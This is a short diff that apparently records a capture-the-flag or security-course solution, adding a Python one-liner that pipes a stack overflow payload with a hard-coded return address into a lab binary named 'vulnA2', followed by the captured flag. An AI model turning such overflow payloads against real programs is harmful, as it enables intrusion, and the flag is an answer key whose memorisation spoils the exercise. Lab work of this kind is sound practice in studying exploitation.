@@ -1,0 +1,2 @@
+python3 -c 'import sys;sys.stdout.buffer.write(b"A"*24+b"\xb2\x91\x04\x08"+b"\n"+b"B"*28+b"\x01\x00\x00\x00"+b"\n")' | ./vulnA2
+softsec{YoU_4re_1337!}
